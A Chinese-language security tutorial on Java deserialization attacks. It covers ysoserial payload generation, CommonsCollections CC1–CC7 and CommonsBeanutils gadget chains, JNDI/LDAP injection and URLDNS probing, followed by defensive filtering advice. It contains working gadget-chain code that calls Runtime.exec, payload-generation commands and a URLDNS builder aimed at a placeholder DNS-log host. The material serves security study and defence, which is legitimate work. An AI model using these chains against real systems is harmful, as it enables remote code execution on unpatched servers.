---
title: Java反序列化漏洞
date: 2026-05-01 08:00:00
tags:
  - 反序列化
  - 框架安全
  - 渗透测试
categories: 渗透测试
---

## 前言

Java反序列化漏洞是近年来Java安全领域最核心的攻击面之一。自2015年Gabriel Lawrence和Chris Frohoff在AppSecCali上发表《Marshalling Pickles》后，反序列化漏洞成为渗透测试和Java安全防御中的焦点。本文从底层机制出发，系统梳理反序列化攻击原理、ysoserial工具链、CommonsCollections各版本链（CC1-CC7）、CommonsBeanutils利用链、JNDI+LDAP注入以及URLDNS探测技巧。

## 一、Java序列化与反序列化基础

### 1.1 序列化机制

Java对象通过实现`java.io.Serializable`接口来获得序列化能力。对象状态被转换为字节流，可用于持久化存储或网络传输。

```java
public class User implements Serializable {
    private static final long serialVersionUID = 1L;
    private String username;
    private transient String password; // transient字段不会被序列化
}
```

序列化与反序列化的基本操作：

```java
// 序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("data.ser"));
oos.writeObject(user);

// 反序列化 —— 危险入口
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("data.ser"));
User obj = (User) ois.readObject(); // 如果readObject中有恶意逻辑，此时触发
```

### 1.2 readObject — 漏洞根源

`ObjectInputStream.readObject()`在反序列化时会自动调用被反序列化对象及其成员对象的`readObject()`方法。若某个类在自定义的`readObject()`中包含了反射调用、文件操作或命令执行逻辑，攻击者通过构造恶意序列化数据即可触发。

**核心成因**：应用反序列化不可信数据时，未对类进行白名单校验，攻击者构造"Gadget Chain"（利用链）串联多个类的方法调用，将无害的入口引向危险的终点。

### 1.3 攻击流程

```
[构造恶意序列化数据] -> [通过HTTP/RMI/JMX/JMS发送至目标]
    -> [目标调用readObject()] -> [触发Gadget Chain] -> [任意代码执行/DNS外带]
```

## 二、ysoserial 工具包

### 2.1 简介

ysoserial是Chris Frohoff与Gabriel Lawrence开发的反序列化Payload生成工具，集成大量Gadget Chain，覆盖CommonsCollections、Spring、Groovy等多个库。

```bash
# 列出所有Payload
java -jar ysoserial.jar

# 生成CC1的Payload
java -jar ysoserial.jar CommonsCollections1 "calc.exe" | base64

# 生成URLDNS检测Payload
java -jar ysoserial.jar URLDNS "http://your-dnslog.example.com"
```

### 2.2 主要Payload速查

| Payload | 依赖 | 关键类 | 特点 |
|---------|------|--------|------|
| CommonsCollections1 | CC 3.1 | AnnotationInvocationHandler | 经典入门链 |
| CommonsCollections2 | CC 4.0 | PriorityQueue, TemplatesImpl | 字节码加载 |
| CommonsCollections3 | CC 3.1 | TemplatesImpl + 代理 | 绕过Runtime限制 |
| CommonsCollections4 | CC 4.0 | PriorityQueue | CC2变体 |
| CommonsCollections5 | CC 3.1 | BadAttributeValueExpException | 兼容高版本JDK |
| CommonsCollections6 | CC 3.1 | HashSet, TiedMapEntry | JDK8高版本通用 |
| CommonsCollections7 | CC 3.1 | Hashtable碰撞 | Hashtable入口 |
| CommonsBeanutils1 | commons-beanutils | BeanComparator | 无需CC依赖 |
| Jdk7u21 | JDK原生 | 无需第三方库 | JDK <=7u21 |
| URLDNS | JDK原生 | HashMap + URL | 无副作用探测 |

## 三、CommonsCollections 利用链详解

### 3.1 Transformer链式调用机制

CC链核心是`org.apache.commons.collections.Transformer`接口，它通过`transform(Object input)`将输入转换为另一个对象。多个Transformer串联形成`ChainedTransformer`，一级级传递触发，最终抵达命令执行。

```java
Transformer[] chain = new Transformer[]{
    new ConstantTransformer(Runtime.class),                        // 返回Runtime.class
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),                 // Ref: getRuntime方法
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),                        // 反射调用获得Runtime实例
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc.exe"})                                  // 调用exec执行
};
Transformer chained = new ChainedTransformer(chain);
chained.transform("anything"); // 触发整条链，最终执行calc.exe
```

### 3.2 CC1 — 经典入门链

CC1利用`LazyMap.get()`的回调机制，结合`AnnotationInvocationHandler.invoke()`代理调用，将反序列化入口与Transformer链串联。

**调用链**：

```
AnnotationInvocationHandler.readObject()
  -> proxyMap.entrySet()
    -> AnnotationInvocationHandler.invoke()
      -> LazyMap.get()
        -> ChainedTransformer.transform()
          -> Runtime.getRuntime().exec()
```

核心构造：通过反射创建`AnnotationInvocationHandler`，将其成员`memberValues`设为`LazyMap`，再生成Map动态代理。当反序列化触发`readObject`时，`AnnotationInvocationHandler`遍历`memberValues`会调用代理对象的`entrySet()`，进而通过`invoke()`落入`LazyMap.get()`。

### 3.3 CC2 / CC4 — PriorityQueue + TemplatesImpl

CC2使用`PriorityQueue.readObject()`作为入口，在堆排序（siftDown）过程中调用`Comparator.compare()`。配合`TransformingComparator`（CC2）或直接使用`PriorityQueue`自身的比较逻辑（CC4），最终触发`TemplatesImpl.newTransformer()`加载恶意字节码。

CC2与CC4的区别在于：CC2使用`InvokerTransformer`构造比较器；CC4改用`ChainedTransformer`，链路上更灵活。

### 3.4 CC3 — 字节码加载路径

CC3在CC1基础上，将直接反射调用`Runtime.exec()`替换为加载恶意`TemplatesImpl`字节码。这种方式在JDK高版本中能绕过对`Runtime.class`的反射限制。

关键差异：`ConstantTransformer`返回`TrAXFilter.class`，通过`InstantiateTransformer`实例化它，而`TrAXFilter`的构造方法接受`Templates`对象并自动调用`newTransformer()`，触发字节码执行。

### 3.5 CC5 — BadAttributeValueExpException入口

CC5使用`javax.management.BadAttributeValueExpException.readObject()`作为入口。该类在`readObject()`中会调用`toString()`，进而触发`TiedMapEntry.toString() -> getValue() -> LazyMap.get()`。不依赖`AnnotationInvocationHandler`，兼容JDK 8u71+。

### 3.6 CC6 — 高版本JDK通用链

CC6是目前实际渗透中使用最广泛的链之一。它以`HashSet.readObject()`为入口，利用`HashMap.hashCode()`触发`TiedMapEntry.hashCode() -> getValue() -> LazyMap.get()`。

```java
// CC6核心构造
Map lazyMap = LazyMap.decorate(new HashMap(), chainTransformer);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
HashSet set = new HashSet(1);
set.add(entry);
lazyMap.clear(); // 确保反序列化时重新触发get()
// 构造完成，HashSet序列化数据即为Payload
```

**CC6调用路径**：

```
HashSet.readObject() -> HashMap.put() -> HashMap.hash()
  -> TiedMapEntry.hashCode() -> TiedMapEntry.getValue()
    -> LazyMap.get() -> ChainedTransformer.transform() -> exec()
```

CC6的优势在于不受JDK版本`AnnotationInvocationHandler`限制影响，在JDK 7和JDK 8所有版本上均可用。

### 3.7 CC7 — Hashtable哈希碰撞链

CC7利用`Hashtable.readObject()`中的`reconstitutionPut`逻辑，通过构造两个哈希值相同但`equals()`返回false的key，触发`LazyMap.get()`。这是CC系列中最后一个有代表性的变体，适用场景与CC6互补。

## 四、CommonsBeanutils（CB）链

CB链不需要CommonsCollections依赖，只要目标应用存在`commons-beanutils`即可利用。核心是`BeanComparator`类——它实现了`Comparator`和`Serializable`，其`compare()`方法会调用`PropertyUtils.getProperty()`。

```java
// CB链构造
TemplatesImpl evilTemplates = ...; // 包含恶意字节码的TemplatesImpl
BeanComparator comparator = new BeanComparator("outputProperties");

PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(1); queue.add(1); // 先填充无害值，避免构造时触发

// 反射替换为恶意对象
Field field = PriorityQueue.class.getDeclaredField("queue");
field.setAccessible(true);
Object[] array = (Object[]) field.get(queue);
array[0] = evilTemplates;
```

**CB链调用路径**：

```
PriorityQueue.readObject() -> PriorityQueue.siftDownUsingComparator()
  -> BeanComparator.compare() -> PropertyUtils.getProperty()
    -> TemplatesImpl.getOutputProperties() -> newTransformer()
      -> 恶意字节码中的静态/构造代码块 -> Runtime.exec()
```

CB链的优势在于适用范围更广——不依赖CommonsCollections，且在JDK 11+部分版本上仍可用。

## 五、JNDI + LDAP 注入

### 5.1 JNDI注入基础

JNDI是Java的命名与目录服务接口。当`InitialContext.lookup()`的参数可控时，攻击者可令客户端连接恶意LDAP/RMI服务器加载远程恶意类。

```java
// 危险代码
String uri = request.getParameter("uri");
Context ctx = new InitialContext();
ctx.lookup(uri); // 若uri指向恶意LDAP服务器，可导致远程类加载
```

### 5.2 与反序列化的联合攻击

**出网场景**（目标可连接外部LDAP服务器）：

```
攻击者LDAP服务器 -> 返回Reference -> 指向HTTP上的恶意.class -> 目标加载执行
```

**不出网场景**（高版本JDK限制了远程Codebase加载）：

攻击者搭建LDAP服务器，在返回的Reference中嵌入序列化Payload。当客户端`lookup()`时，JNDI实现内部会反序列化该对象，触发Gadget Chain。这就是"JNDI + 反序列化"联合攻击。

### 5.3 高版本JDK限制

- JDK 8u121+：`com.sun.jndi.rmi.object.trustURLCodebase` 默认false
- JDK 8u191+：`com.sun.jndi.ldap.object.trustURLCodebase` 默认false
- JDK 11.0.1+：进一步收紧

但即使无法远程加载字节码，只要目标classpath中存在可用的本地Gadget Class，通过JNDI返回序列化数据仍可能成功利用。

## 六、URLDNS — 无副作用探测

### 6.1 原理

URLDNS是ysoserial中最特殊的链：它不执行代码，仅触发一次DNS查询。利用`HashMap.readObject()`反序列化时对key调用`hashCode()`，而`URL.hashCode()`需通过`InetAddress.getByName()`解析域名，自然地发起DNS请求。

**调用链**：

```
HashMap.readObject() -> putVal() -> hash()
  -> URL.hashCode() -> URLStreamHandler.hashCode()
    -> getHostAddress() -> InetAddress.getByName() -> DNS查询
```

### 6.2 手工构造

```java
public Object generateURLDNS(String dnslogUrl) throws Exception {
    URL url = new URL(dnslogUrl);
    HashMap<URL, Integer> map = new HashMap<>();

    Field f = URL.class.getDeclaredField("hashCode");
    f.setAccessible(true);
    f.set(url, -1); // put时不触发DNS

    map.put(url, 0);
    f.set(url, -1); // 重置，确保反序列化时重新触发DNS
    return map;
}
```

### 6.3 实战流程

```
1. 申请DNSLog平台临时域名 (如 abc.dnslog.cn)
       |
2. 生成Payload: java -jar ysoserial.jar URLDNS "http://abc.dnslog.cn"
       |
3. 将Payload注入全部可疑的反序列化入口 (HTTP参数/Cookie/Base64)
       |
4. 查看DNSLog平台是否收到查询
       |
5. 收到 -> 确认漏洞存在 -> 进一步构造利用链
   未收到 -> 不代表安全, 可能因防火墙/DNS限制
```

### 6.4 URLDNS优势

- 纯JDK原生类，无需任何第三方依赖
- 不执行命令，不留下系统日志
- DNS查询通常不被防火墙拦截
- 适合大规模自动化扫描

## 七、防御与修复

### 开发侧

1. **类白名单过滤**：JDK 9+使用`ObjectInputFilter`限制可反序列化的类：

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.lang.*;java.util.*;com.myapp.*;!*");
ObjectInputStream ois = new ObjectInputStream(in);
ois.setObjectInputFilter(filter);
```

2. **避免使用Java原生序列化**：优先使用JSON、Protobuf等格式。

3. **依赖升级**：确保CommonsCollections、commons-beanutils等为安全版本。

4. **代码审计**：排查所有`readObject()`、`readUnshared()`调用点。

### 运维侧

1. **WAF规则**：检测Java序列化魔数`0xACED`（Base64特征：`rO0`）。
2. **RASP运行时防护**：监控`Runtime.exec()`等系统调用。
3. **最小权限**：Java进程不应具有执行系统命令的权限。

## 八、总结

- 反序列化漏洞核心：`readObject()`对不可信数据的自动递归处理
- ysoserial集成了CC1-CC7、CB、URLDNS等大量Gadget Chain
- CC1/CC3依赖AnnotationInvocationHandler，CC2/CC4基于PriorityQueue
- CC5/CC6/CC7通过不同入口（BadAttributeValueExpException / HashSet / Hashtable）适配不同JDK版本
- CB链不依赖CC库，通过BeanComparator触发TemplatesImpl
- JNDI+LDAP可结合反序列化，实现远程类加载或本地Gadget触发
- URLDNS是无副作用的探测首选，利用DNS查询确认漏洞
- 防御需从代码白名单、运行时监控、网络层检测三个维度同步进行

## 免责声明

> **本文仅供安全研究与教学目的使用。** 文中涉及的技术仅供合法的渗透测试、安全评估和学习交流。任何人不得利用本文所述技术进行未授权的入侵、攻击或破坏。因不当使用造成的一切后果由使用者自行承担，作者概不负责。安全测试前请务必获得目标系统的明确书面授权。

---

*参考项目：*
- [ysoserial](https://github.com/frohoff/ysoserial)
- [Java Object Serialization Specification](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html)
- FoxGlove Security — *Marshalling Pickles*
